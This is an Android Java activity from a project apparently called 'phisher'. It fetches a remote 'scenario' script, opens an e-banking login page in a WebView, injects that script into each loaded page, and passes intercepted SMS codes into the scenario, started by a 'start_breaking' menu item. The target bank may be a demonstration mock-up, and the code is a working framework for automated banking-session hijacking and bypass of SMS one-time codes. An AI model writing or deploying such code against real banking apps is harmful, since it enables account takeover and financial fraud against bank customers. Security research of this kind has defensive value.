package pl.jasiun.phisher;

import pl.jasiun.phisher.scenario.Scenario;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;

@SuppressLint("SetJavaScriptEnabled")
public class WebViewActivity extends Activity implements StageManager {
	
	private WebView webView;
	
	private Scenario scenario;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        setContentView(R.layout.activity_web_view);
        
        webView = (WebView)findViewById(R.id.webView);
        getWebView().getSettings().setJavaScriptEnabled(true);
        
        FileDownloadTask downloadScenarionTask = new FileDownloadTask() {
			
			@Override
			protected void onPostExecute(byte[] result) {
				scenarioDownloaded(result);				
			}
		};
		downloadScenarionTask.execute("http://phisher.jasiun.pl/seabank.scenario.xml");
    }

	private void scenarioDownloaded(byte[] result) {
		final ScenarioParser scenarioParser = new ScenarioParser(result);
		scenario = scenarioParser.getScenario(this);
		
		getWebView().setWebViewClient(new WebViewClient()
        {
        	    public boolean shouldOverrideUrlLoading(WebView webView, String url){
        	    	webView.loadUrl(url);
        	        return false;
        	   }
        	    
        	    public void onPageFinished (WebView webView, String url) {
        	    	webView.loadUrl(scenarioParser.getPermanentCode());
        	    	
        	    	scenario.pageLoaded();
        	    }
        });
        
        getWebView().addJavascriptInterface(new JavaScriptInterface(this), "Android");
        
        getWebView().loadUrl("http://seabank.jasiun.pl/ebanking/login/");
	}
	
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		getMenuInflater().inflate(R.menu.activity_web_view, menu);
		return true;
	}
	
	@Override
	public boolean onMenuItemSelected(int featureId, MenuItem item) {
		switch (item.getItemId()) {
		case R.id.start_breaking:
			scenario.play();
			return true;
		default:
			return super.onMenuItemSelected(featureId, item);
		}
	}
    
    protected void onNewIntent (Intent intent) {
    	scenario.smsReceived(intent.getExtras().getString("CODE"));
    }

	public WebView getWebView() {
		return webView;
	}

	@Override
	public void sendIntent(Intent intent) {
		sendBroadcast(intent);
	}

	@Override
	public void loadUrl(String url) {
		webView.loadUrl(url);
	}
}
